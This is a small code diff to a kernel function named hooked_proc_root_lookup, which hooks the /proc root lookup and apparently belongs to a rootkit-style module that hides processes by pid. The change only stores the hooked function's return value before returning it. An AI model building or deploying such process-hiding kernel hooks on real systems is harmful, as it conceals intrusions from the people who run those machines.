@@ -152,6 +152,7 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
     char *endptr;
     long pid;
     const char *name;
+    struct dentry *ret;
 	typedef struct dentry * (*original_lookup_t)(struct inode *, struct dentry *, unsigned int);
     original_lookup_t original_function = (original_lookup_t)p_proc_root_lookup_hook.stub->orig;
 
@@ -163,7 +164,8 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
         }
     }
 
-    return original_function(dir, dentry, flags);
+    ret = original_function(dir, dentry, flags);
+    return ret;
 }
 
 static char p_proc_root_lookup_hook_state = 0;
